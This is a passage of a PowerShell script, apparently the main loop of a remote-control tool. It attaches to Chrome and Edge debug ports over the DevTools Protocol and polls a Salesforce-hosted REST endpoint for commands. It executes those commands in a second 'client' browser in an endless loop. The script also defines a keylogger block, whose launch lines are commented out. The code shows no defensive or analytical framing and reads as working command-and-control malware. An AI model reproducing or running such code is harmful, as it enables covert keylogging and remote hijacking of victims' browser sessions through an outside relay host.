            $msgstr = $msgstrs -join " "
            Log-Msg "system state --  $msgstr"
        } catch {
            Log-Msg $_
        }        
    }

}

$script:pubnuburl = "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub"
$clientport = $script:chrome_debugport
$pubnubport = $script:msedge_debugport
# TODO check both 9222 and 9223 and figure out which one points to pubnub browser
# pubnub is whichever browser is holding a target that points to $pubnuburl
# client is a browser that has an active target and no target pointing to pubnuburl -- if no client found, 
# delay and try again

$script:pubnubws = [PSCDP]::new($pubnubport, $pubnuburl)
$script:pubnubws.ConnectCdp()

$script:clientws = [PSCDP]::new($clientport)
$script:clientws.ConnectCdp()

$keyboardlogger = {
    try {
        [PowerShell.KeyLogger]::Main()
    } finally {
        if ($script:SingleInstanceEvent) {
            $script:SingleInstanceEvent.Dispose()
        }
    }
}

# $ps = [powershell]::Create().AddScript($keyboardlogger)
# $asyncResult = $ps.BeginInvoke()

$d = 200
$n = 50
$i = 0
while ( $true ) {

    # ! need to implement cmd to reset all memory as responses/cmds might take up too much space

    Log-Msg "new iteration -- $i/$n"

    try {
        $script:pubnubws.LogState() # TODO need to check if pubnub connection is active

        $script:pubnubws.CheckSocket()

        $script:pubnubws.InitReceive()
        $script:pubnubws.ReadMessage()
        $script:pubnubws.EndMessage()

        $script:pubnubws.ExecCallbacks()
        $script:pubnubws.NextCmd()    

        if ( $i -ge $n ) {
            $script:pubnubws.Broadcast()
            # need to check if target pointing to pubnub url is active
            # if not, create target, reset, etc.
            $i=0
        }
    
    } catch [PSCDPException]  {
        if ( $_.Exception.ispubnubnull ) {
            Log-Msg $_
        }
    } catch {
        Write-Error $($_.Exception.Message)
        Write-Host $_.ScriptStackTrace -ForegroundColor DarkGray

        $script:pubnubws.Reset()
        $script:pubnubws.ConnectCdp()
    }


    try {
        $script:clientws.LogState()

        $script:clientws.CheckSocket()

        $script:clientws.InitReceive()
        $script:clientws.ReadMessage()
        $script:clientws.EndMessage()

        $script:clientws.ExecCallbacks()
        $script:clientws.NextCmd()
    } catch {
        Log-Msg $_

        $script:clientws.Reset()
        $script:clientws.ConnectCdp()
    }


    Log-Msg "...sleeping"

    Start-Sleep -Milliseconds $d
    $i++
}

exit

<#
if ( $null -eq $readtask ) {
    $readbuf = [byte[]]::new($bufferSize)
    $readtask = $reader.ReadAsync($readbuf, 0, $bufferSize, [System.Threading.CancellationToken]::None)
}

if ( $null -ne $readtask -and $readtask.IsCompleted ) {
    $bytesRead = $readTask.GetAwaiter().GetResult()
    $message = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
    $hashobj = ConvertFrom-Json -InputObject $message -AsHashtable
    $sendQueue.Add($hashobj)
    $readtask = $null
}
#>